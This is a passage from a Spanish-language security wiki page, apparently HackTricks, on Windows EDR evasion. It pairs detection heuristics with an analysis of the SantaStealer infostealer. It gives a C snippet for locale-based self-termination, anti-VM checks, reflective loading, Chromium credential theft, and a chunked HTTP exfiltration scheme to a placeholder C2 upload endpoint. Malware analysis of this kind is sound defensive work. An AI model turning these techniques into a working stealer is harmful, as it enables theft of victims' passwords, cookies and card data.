- IAT integrity: entradas que se resuelven a direcciones no‑image (heap/anon); verificación periódica de punteros de importación.
- Stack anomalies: direcciones de retorno que no pertenecen a imágenes cargadas; transiciones abruptas a PIC no‑imagen; ascendencia inconsistente de RtlUserThreadStart.
- Loader telemetry: escrituras in‑process al IAT, actividad temprana en DllMain que modifica import thunks, regiones RX inesperadas creadas al cargar.
- Image‑load evasion: si hookeas LoadLibrary*, monitoriza cargas sospechosas de automation/clr assemblies correlacionadas con memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer: Técnicas para evasión sin archivos y robo de credenciales

SantaStealer (aka BluelineStealer) ilustra cómo los info-stealers modernos combinan AV bypass, anti-analysis y acceso a credenciales en un único flujo de trabajo.

### Filtrado por distribución de teclado y retraso anti-sandbox

- Una bandera de configuración (`anti_cis`) enumera las distribuciones de teclado instaladas vía `GetKeyboardLayoutList`. Si se encuentra una distribución cirílica, la muestra deja un marcador `CIS` vacío y termina antes de ejecutar los stealers, asegurando que nunca detone en locales excluidos mientras deja un artefacto para la caza.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica en capas `check_antivm`

- Variant A recorre la lista de procesos, hashes cada nombre con una suma de comprobación rodante personalizada, y lo compara contra blocklists integradas para debuggers/sandboxes; repite la checksum sobre el nombre del equipo y comprueba directorios de trabajo como `C:\analysis`.
- Variant B inspecciona propiedades del sistema (process-count floor, recent uptime), llama a `OpenServiceA("VBoxGuest")` para detectar VirtualBox additions, y realiza timing checks alrededor de sleeps para detectar single-stepping. Cualquier detección aborta antes de que se lancen los módulos.

### Fileless helper + double ChaCha20 reflective loading

- La DLL/EXE primaria incrusta un Chromium credential helper que o bien se deja en disco o se mapea manualmente in-memory; el modo fileless resuelve imports/relocations por sí mismo para que no se escriban artefactos del helper.
- Ese helper almacena una DLL de segunda etapa cifrada dos veces con ChaCha20 (two 32-byte keys + 12-byte nonces). Tras ambas pasadas, reflectively loads el blob (no `LoadLibrary`) y llama a las exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Las rutinas de ChromElevator usan direct-syscall reflective process hollowing para inyectar en un Chromium browser vivo, heredar AppBound Encryption keys, y decrypt passwords/cookies/credit cards directamente desde bases de datos SQLite a pesar del hardening ABE.

### Colección modular in-memory y exfil HTTP por chunks

- `create_memory_based_log` itera una tabla global de punteros a función `memory_generators` y crea un hilo por cada módulo habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada hilo escribe resultados en buffers compartidos y reporta su conteo de archivos tras una ventana de join de ~45s.
- Una vez finalizado, todo se comprime con la librería estáticamente linkada `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` entonces duerme 15s y streama el archivo en chunks de 10 MB vía HTTP POST a `http://<C2>:6767/upload`, falsificando un browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Cada chunk añade `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, y el último chunk añade `complete: true` para que el C2 sepa que la reensamblación ha terminado.

## Referencias

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
